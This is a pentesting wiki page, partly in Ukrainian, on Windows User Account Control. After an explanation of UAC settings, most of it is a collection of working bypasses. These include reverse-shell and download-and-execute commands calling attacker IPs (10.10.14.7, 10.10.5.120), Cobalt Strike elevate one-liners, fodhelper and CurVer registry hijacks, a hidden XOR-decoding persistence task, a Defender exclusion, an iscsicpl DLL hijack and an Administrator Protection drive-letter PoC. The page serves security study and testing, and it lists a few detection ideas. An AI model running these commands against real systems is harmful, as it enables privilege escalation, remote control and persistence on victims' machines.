# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка вмикає **consent prompt для elevated activities**. Applications мають різні рівні `integrity`, і програма з **high level** може виконувати завдання, які **could potentially compromise the system**. Коли UAC увімкнено, applications і tasks завжди **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. Це зручна функція, яка захищає administrators від ненавмисних змін, але не вважається security boundary.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

When UAC is in place, an administrator user is given 2 tokens: a standard user key, to perform regular actions as regular level, and one with the admin privileges.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) discusses how UAC works in great depth and includes the logon process, user experience, and UAC architecture. Administrators can use security policies to configure how UAC works specific to their organization at the local level (using secpol.msc), or configured and pushed out via Group Policy Objects (GPO) in an Active Directory domain environment. The various settings are discussed in detail [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). There are 10 Group Policy settings that can be set for UAC. The following table provides additional detail:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies for installing software on Windows

The **local security policies** ("secpol.msc" on most systems) are configured by default to **prevent non-admin users from performing software installations**. This means that even if a non-admin user can download the installer for your software, they won't be able to run it without an admin account.

### Registry Keys to Force UAC to Ask for Elevation

As a standard user with no admin rights, you can make sure the "standard" account is **prompted for credentials by UAC** when it attempts to perform certain actions. This action would require modifying certain **registry keys**, for which you need admin permissions, unless there is a **UAC bypass**, or the attacker is already logged as admin.

Even if the user is in the **Administrators** group, these changes force the user to **re-enter their account credentials** in order to perform administrative actions.

**The only downside is that this approach needs UAC disabled to work, which is unlikely to be the case in production environments.**

The registry keys and entries that you must change are the following (with their default values in parentheses):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

This can also be done manually through the Local Security Policy tool. Once changed, administrative operations prompt the user to re-enter their credentials.

### Note

**User Account Control is not a security boundary.** Therefore, standard users cannot break out of their accounts and gain administrator rights without a local privilege escalation exploit.

### Ask for 'full computer access' to a user
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode використовує integrity checks, щоб запобігти тому, щоб процеси з high-integrity-level (наприклад, web browsers) отримували доступ до даних low-integrity-level (наприклад, папки temporary Internet files). Це робиться шляхом запуску browser із low-integrity token. Коли browser намагається отримати доступ до даних, що зберігаються в low-integrity zone, операційна система перевіряє integrity level процесу та дозволяє доступ відповідно. Ця функція допомагає запобігти тому, щоб remote code execution attacks отримували доступ до чутливих даних у системі.
- Коли користувач входить у Windows, система створює access token, який містить список privileges користувача. Privileges визначаються як поєднання прав і можливостей користувача. Token також містить список credentials користувача, які використовуються для authenticating користувача на комп'ютері та до ресурсів у network.

### Autoadminlogon

Щоб налаштувати Windows на автоматичний вхід певного користувача під час запуску, встановіть **`AutoAdminLogon` registry key**. Це корисно для kiosk environments або для testing purposes. Використовуйте це лише на secure systems, оскільки пароль буде exposed у registry.

Встановіть такі keys за допомогою Registry Editor або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Щоб повернутися до звичайної поведінки logon, встановіть `AutoAdminLogon` на 0.

## UAC bypass

> [!TIP]
> Зверніть увагу: якщо у вас є graphical access до victim, UAC bypass виконується straightforward, оскільки ви можете просто натиснути "Yes", коли з'явиться UAC prompt

UAC bypass потрібен у такій ситуації: **UAC активовано, ваш process працює в medium integrity context, і ваш user належить до administrators group**.

Важливо зазначити, що **обійти UAC набагато важче, якщо він має найвищий security level (Always), ніж якщо він на будь-якому з інших рівнів (Default).**

### UAC disabled

Якщо UAC уже disabled (`ConsentPromptBehaviorAdmin` має значення **`0`**), ви можете **execute reverse shell з admin privileges** (high integrity level), використовуючи щось на кшталт:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "bypass" (повний доступ до файлової системи)

If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (file system) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).

> [!WARNING]
> **Схоже, що цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Техніки Cobalt Strike працюватимуть лише якщо UAC не встановлено на його максимальний рівень безпеки
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** та **Metasploit** також мають кілька модулів, щоб **bypass** **UAC**.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME)який є **compilation** кількох UAC bypass exploits. Зауважте, що вам потрібно буде **compile UACME using visual studio or msbuild**. Під час compilation буде створено кілька executables (наприклад, `Source\Akagi\outout\x64\Debug\Akagi.exe`) , вам потрібно буде знати, **який саме вам потрібен.**\
Вам слід **бути обережним**, тому що деякі bypasses можуть **promtp some other programs** that will **alert** the **user** that something is happening.

UACME має **build version from which each technique started working**. Ви можете пошукати техніку, що впливає на ваші версії:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також, використовуючи [цей](https://en.wikipedia.org/wiki/Windows_10_version_history) page, ви отримуєте Windows release `1607` з build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений binary `fodhelper.exe` auto-elevated на modern Windows. When launched, it queries the per-user registry path below without validating the `DelegateExecute` verb. Planting a command there allows a Medium Integrity process (user is in Administrators) to spawn a High Integrity process without a UAC prompt.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Кроки PowerShell (встановіть свій payload, потім запустіть)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Примітки:
- Працює, коли поточний користувач є членом Administrators і рівень UAC за замовчуванням/пом’якшений (не Always Notify із додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-bit PowerShell із 32-bit процесу на 64-bit Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шлях до EXE). Уникайте UI-підказок для stealth.

#### Варіант перехоплення CurVer/extension (лише HKCU)

Нещодавні samples, що зловживають `fodhelper.exe`, уникають `DelegateExecute` і натомість **перенаправляють `ms-settings` ProgID** через per-user значення `CurVer`. Автопідвищуваний binary все ще визначає handler у `HKCU`, тож admin token не потрібен, щоб створити ключі:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Після підвищення привілеїв malware зазвичай **вимикає майбутні запити** шляхом встановлення `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у `0`, а потім виконує додаткове ухилення від захисту (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і відтворює persistence, щоб запускатися з high integrity. Типове завдання persistence зберігає **XOR-encrypted PowerShell script** на диску і декодує/виконує його в-memory щогодини:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Цей варіант усе ще очищає dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **`CurVer` hijack**, підміни `ConsentPromptBehaviorAdmin`, створення Defender exclusion або scheduled tasks, які decrypt PowerShell у пам’яті.

#### More UAC bypass

**Усі** техніки, використані тут для обходу AUC, **потребують** **повноцінного інтерактивного shell** із жертвою (звичайного nc.exe shell недостатньо).

Ви можете отримати це через сесію **meterpreter**. Перемістіться в **process**, у якого значення **Session** дорівнює **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ має підійти)

### UAC Bypass with GUI

Якщо у вас є доступ до **GUI, ви можете просто прийняти UAC prompt**, коли він з’явиться, вам насправді не потрібен bypass. Тож доступ до GUI дозволить вам обійти UAC.

Крім того, якщо ви отримаєте GUI session, якою хтось користувався (потенційно через RDP), існують **деякі tools, які працюватимуть як administrator**, звідки ви могли б **запустити** наприклад **cmd** **as admin** напряму, без повторного запиту від UAC, як-от [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути трохи **stealthy**.

### Noisy brute-force UAC bypass

Якщо вас не турбує шум, ви завжди можете **запустити щось на кшталт** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin), що **просить підвищити permissions, доки user не погодиться**.

### Your own bypass - Basic UAC bypass methodology

Якщо подивитися на **UACME**, можна помітити, що **більшість UAC bypasses зловживають вразливістю Dll Hijacking** (переважно записуючи malicious dll у _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть binary, який буде **autoelevate** (перевірте, що під час запуску він працює на високому рівні integrity).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Вам, ймовірно, потрібно буде **записати** DLL всередину деяких **protected paths** (наприклад, C:\Windows\System32), де у вас немає прав на запис. Це можна обійти за допомогою:
1. **wusa.exe**: Windows 7,8 та 8.1. Дозволяє витягувати вміст CAB file у protected paths (оскільки цей tool виконується з високого рівня integrity).
2. **IFileOperation**: Windows 10.
4. Підготуйте **script**, щоб скопіювати вашу DLL у protected path і виконати вразливий та autoelevated binary.

### Another UAC bypass technique

Полягає в тому, щоб перевірити, чи намагається **autoelevated binary** **читати** з **registry** **name/path** binary або command, який буде **executed** (це ще цікавіше, якщо binary шукає цю інформацію всередині **HKCU**).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` — це **auto-elevated** binary, який можна використати для завантаження `iscsiexe.dll` через search order. Якщо ви можете розмістити malicious `iscsiexe.dll` у **user-writable** folder, а потім змінити current user `PATH` (наприклад, через `HKCU\Environment\Path`), щоб цей folder був у пошуку, Windows може завантажити attacker DLL у процес `iscsicpl.exe` з підвищеними правами **без показу UAC prompt**.

Практичні нотатки:
- Це корисно, коли current user входить до **Administrators**, але працює з **Medium Integrity** через UAC.
- Копія в **SysWOW64** є релевантною для цього bypass. Розглядайте копію в **System32** як окремий binary і перевіряйте поведінку незалежно.
- Примітив є комбінацією **auto-elevation** і **DLL search-order hijacking**, тому той самий ProcMon workflow, який використовують для інших UAC bypasses, корисний для підтвердження відсутнього завантаження DLL.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- Alert on `reg add` / registry writes to `HKCU\Environment\Path` immediately followed by execution of `C:\Windows\SysWOW64\iscsicpl.exe`.
- Hunt for `iscsiexe.dll` in **user-controlled** locations such as `%TEMP%` or `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate `iscsicpl.exe` launches with unexpected child processes or DLL loads from outside the normal Windows directories.

### Administrator Protection (25H2) drive-letter hijack via per-logon-session DOS device map

Windows 11 25H2 “Administrator Protection” uses shadow-admin tokens with per-session `\Sessions\0\DosDevices/<LUID>` maps. The directory is created lazily by `SeGetTokenDeviceMap` on first `\??` resolution. If the attacker impersonates the shadow-admin token only at **SecurityIdentification**, the directory is created with the attacker as **owner** (inherits `CREATOR OWNER`), allowing drive-letter links that take precedence over `\GLOBAL??`.

**Steps:**

1. From a low-privileged session, call `RAiProcessRunOnce` to spawn a promptless shadow-admin `runonce.exe`.
2. Duplicate its primary token to an **identification** token and impersonate it while opening `\??` to force creation of `\Sessions\0\DosDevices/<LUID>` under attacker ownership.
3. Create a `C:` symlink there pointing to attacker-controlled storage; subsequent filesystem accesses in that session resolve `C:` to the attacker path, enabling DLL/file hijack without a prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)
- [Checkpoint Research – KONNI Adopts AI to Generate PowerShell Backdoors](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Windows Administrator Protection drive-letter hijack](https://projectzero.google/2026/26/windows-administrator-protection.html)

{{#include ../../banners/hacktricks-training.md}}
